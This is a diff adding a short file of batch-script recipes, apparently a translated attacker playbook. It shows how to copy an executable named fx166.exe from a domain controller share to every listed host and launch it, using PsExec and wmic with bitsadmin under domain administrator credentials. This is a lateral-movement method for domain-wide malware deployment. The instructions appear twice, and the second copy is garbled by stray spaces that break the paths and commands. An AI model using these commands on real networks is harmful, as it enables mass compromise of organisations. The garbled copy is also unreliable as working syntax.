@@ -1,0 +1,26 @@
+COLLECTING A BATCH FILE FOR COPYING A FILE ACROSS THE ENTIRE
+start DOMAIN PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\ \ PRIMARY DOMAIN CONTROLLER\share$\fx166.exe" "C:\windows\temp\"
+SAVE AS "COPY. BAT"
+
+COLLECTING A BATCH FILE FOR LAUNCHING A FILE ACROSS THE ENTIRE
+start DOMAIN PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
+WE SAVE IT AS "EXE. BAT"
+
+COLLECTING THE WMI BATCH FILE FOR COPYING AND RUNNING THE FILE ACROSS THE ENTIRE DOMAIN
+start wmic /node:@C:\share$\comps1.txt /user: "DOMAIN\Administrator" /password: "PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \ \ DOMAIN CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe&%APPDATA%\fx166.exe "
+SAVE AS" WMI. BAT"
+
+
+
+english
+COLLECTING A DOMAIN FOR COPYING A FILE
+start PsExec.exe / accepteula @C: \ share $ \ comps1.txt -u DOMAIN \ ADMINISTRATOR -p PASSWORD cmd / c COPY "\\ PRIMARY DOMAIN CONTROLLER \ share $ \ fx166.exe" "C: \ windows \ temp \ "
+WE SAVE AS "COPY.BAT"
+
+COLLECTING A DOMAIN TO RUN A FILE
+start PsExec.exe -d @C: \ share $ \ comps1.txt -u DOMAIN \ ADMINISTRATOR -p PASSWORD cmd / c c: \ windows \ temp \ fx166.exe
+WE SAVE AS "EXE.BAT"
+
+COLLECTING WMI DATABASE FOR COPYING AND RUNNING A FILE ALL OVER THE DOMAIN
+start wmic /node:@C:\share$\comps1.txt / user: "DOMAIN \ Administrator" / password: "PASSWORD" process call create "cmd.exe / c bitsadmin / transfer fx166 \\ DOMAIN CONTROLLER \ share $ \ fx166.exe% APPDATA% \ fx166.exe &% APPDATA% \ fx166.exe "
+WE SAVE AS "WMI.BAT"
